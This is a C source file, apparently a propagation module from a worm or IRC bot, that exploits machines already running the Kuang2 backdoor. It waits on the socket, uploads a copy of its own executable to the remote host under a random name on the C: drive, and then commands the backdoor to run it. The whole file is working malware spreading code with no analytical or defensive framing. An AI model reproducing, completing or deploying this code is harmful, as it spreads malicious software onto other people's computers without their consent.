#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_KUANG2

// globals
char k2_buffer[1024];
pMessage k2_msg = (pMessage) k2_buffer;

int KUANG_Reciev(SOCKET sock)
{
	TIMEVAL time;
	time.tv_sec = 30; //timeout after 60 sec.
	time.tv_usec = 0;

	fd_set fd_struct;
   	FD_ZERO(&fd_struct);
	FD_SET(sock, &fd_struct);

	if (fselect(0, &fd_struct, NULL, NULL, &time) <= 0) {
		fclosesocket(sock); 
		return -1;
	}

	memset(k2_buffer,0,sizeof(k2_buffer));
	if (frecv(sock, k2_buffer, sizeof(k2_buffer), 0) < 1) 
		return -1;
	if (k2_msg->command == K2_ERROR)
		return -1;
      	      
	return 0;
}	

int KUANG(SOCKET sock)
{
	HANDLE testfile;
	char rBuffer[1024], thisfilename[MAX_PATH], randFile[5], rFile[15];

	unsigned int Fsize, move;
	int x;
	DWORD mode = 0;

	memset(rFile,0,sizeof(rFile));
	memset(randFile,0,sizeof(randFile));
	srand(GetTickCount());

	for (x=0;x < 4;x++)
		randFile[x] = (char)((rand()%26)+97);
	randFile[x+1] = '\0';
	sprintf(rFile,"c:\\%s.exe",randFile);

	fioctlsocket(sock,FIONBIO,&mode); //set the socket back to blocking
	if (KUANG_Reciev(sock) == -1) 
		goto end;

	memset(k2_buffer,0,sizeof(k2_buffer));
	GetModuleFileName(NULL,thisfilename,sizeof(thisfilename));
	testfile = CreateFile(thisfilename,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		goto end;
	Fsize = GetFileSize(testfile,NULL);

	k2_msg->command=K2_UPLOAD_FILE;
	k2_msg->param=Fsize;
	strcpy(k2_msg->sdata,rFile);
	//strcpy(k2_msg->bdata,rFile);
	//CloseHandle(testfile);

	fsend(sock,k2_buffer,1024, 0);
	if (KUANG_Reciev(sock) == -1) 
		goto end;

	while (Fsize) {
		unsigned int Fsend = 1024;
		memset(rBuffer,0,sizeof(rBuffer));

		if (Fsend>Fsize) 
			Fsend=Fsize;
		move = 0-Fsize;

		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, rBuffer, Fsend, &mode, NULL);

		int bytes_sent = fsend(sock, rBuffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (fWSAGetLastError() != WSAEWOULDBLOCK) 
				break;
			else 
				bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;
	}

	if (KUANG_Reciev(sock) == -1) 
		goto end;
	if (testfile != INVALID_HANDLE_VALUE) 
		CloseHandle(testfile);

	memset(k2_buffer,0,sizeof(k2_buffer));
	k2_msg->command=K2_RUN_FILE;
	sprintf(k2_msg->bdata,rFile);
	fsend(sock,k2_buffer ,1024, 0);

	if (KUANG_Reciev(sock) == -1) 
		goto end;
	memset(k2_buffer,0,sizeof(k2_buffer));
	k2_msg->command=K2_QUIT;
	fsend(sock,k2_buffer ,4, 0);

	return 1;

	end:;

	fclosesocket(sock);

	return 0;
}
#endif
